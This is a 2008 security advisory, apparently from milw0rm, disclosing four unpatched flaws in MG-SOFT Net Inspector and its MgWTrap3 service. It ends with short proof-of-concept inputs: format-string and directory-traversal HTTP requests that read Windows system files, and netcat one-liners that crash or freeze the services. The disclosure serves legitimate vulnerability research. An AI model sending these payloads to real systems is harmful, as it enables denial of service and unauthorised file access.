@@ -1,0 +1,130 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  MG-SOFT Net Inspector
+              http://www.mg-soft.com/netinsp.html
+              (bug C affects any MgWTrap3 service which is included in
+              almost all the MG-SOFT products like MIB Browser, Query
+              Manager, Trap Ringer Pro and so on)
+Versions:     Net Inspector <= 6.5.0.828
+Platforms:    Windows and Linux
+Bugs:         A] format string in mghttpd
+              B] directory traversal in mghttpd
+              C] crash in MgWTrap3
+              D] Denial of Service in niengine
+Exploitation: remote
+Date:         14 Mar 2008
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bugs
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+>From vendor's website:
+"MG-SOFT Net Inspector is a powerful fault management application with
+alarming subsystem that complies with the international alarm reporting
+recommendations (ITU X.733). The software lets you effectively monitor
+the status of network devices and manage alarms associated with devices
+in the supervised TCP/IP network."
+
+
+#######################################################################
+
+=======
+2) Bugs
+=======
+
+---------------------------
+A] format string in mghttpd
+---------------------------
+
+mghttpd is a simple HTTP daemon running on port 5228 used to allow the
+clients to download the Net Inspector Java Client.
+This server is affected by a format string vulnerability located in the
+function which logs the clients requests in the log file.
+
+
+---------------------------------
+B] directory traversal in mghttpd
+---------------------------------
+
+This service is also affected by a classical directory traversal
+vulnerability using both the slash and backslash plain delimiters which
+can be exploited to download files from the disk on which is located
+the server.
+
+
+--------------------
+C] crash in MgWTrap3
+--------------------
+
+The SNMP Trap Service other than binding the local TCP port 8888 and
+the UDP 162 for collecting SNMP queries, binds also an additional UDP
+port which changes each time the service is executed (uses the first
+free available port).
+Sending a packet (empty or with any desired content since it's not
+important) directly to this port raises an exception which terminates
+the service immediately.
+This service is the core of almost all the MG-SOFT products which so
+result all vulnerable.
+
+
+--------------------------------
+D] Denial of Service in niengine
+--------------------------------
+
+The Net Inspector Fault Management server (niengine) can be easily
+freezed with CPU at 100% and full memory consumption through a
+malformed or incomplete packet.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+A]
+GET /%n%n%s%s%n%n%n%s HTTP/1.0
+
+B]
+GET ../../../../boot.ini HTTP/1.0
+GET \../..\../..\windows/win.ini HTTP/1.0
+
+C]
+echo|nc SERVER PORT -v -v -u
+
+D]
+echo -n -e \x2a\x45\x67\xf2\x00\x00\x00\x00|nc SERVER 5221 -v -v -w 1
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix
+
+
+#######################################################################
+
+# milw0rm.com [2008-03-17]
